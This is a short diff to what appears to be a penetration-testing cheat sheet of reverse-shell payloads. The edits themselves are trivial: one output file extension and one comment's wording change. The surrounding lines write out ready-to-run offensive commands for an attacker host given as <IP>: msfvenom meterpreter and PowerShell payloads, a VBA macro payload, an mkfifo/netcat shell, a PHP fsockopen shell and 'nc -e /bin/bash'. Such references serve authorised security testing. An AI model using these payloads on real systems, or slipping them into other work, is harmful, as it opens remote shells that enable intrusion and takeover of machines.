@@ -19,7 +19,7 @@ msfvenom -p windows/meterpreter/reverse_http LHOST=<IP> LPORT=<port> -f exe > sh
 msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<port> -f exe > shell.exe
 
 # Powershell Payload
-msfvenom -p cmd/windows/reverse_powershell LHOST=<IP> LPORT=<port> > shell.bat
+msfvenom -p cmd/windows/reverse_powershell LHOST=<IP> LPORT=<port> > shell.ps1
 
 # Macro Payload
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f vba
@@ -33,7 +33,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <port> >/tmp/f
 # Minimal PHP Rev Shell
 php -r '$sock=fsockopen("<IP>",<port>);exec("/bin/bash -i <&3 >&3 2>&3");'
 
-# nc Plain Rev Shell
+# nc plain Rev Shell
 nc -e /bin/bash <IP> <port>
 
 # Windows PowerShell RevShell
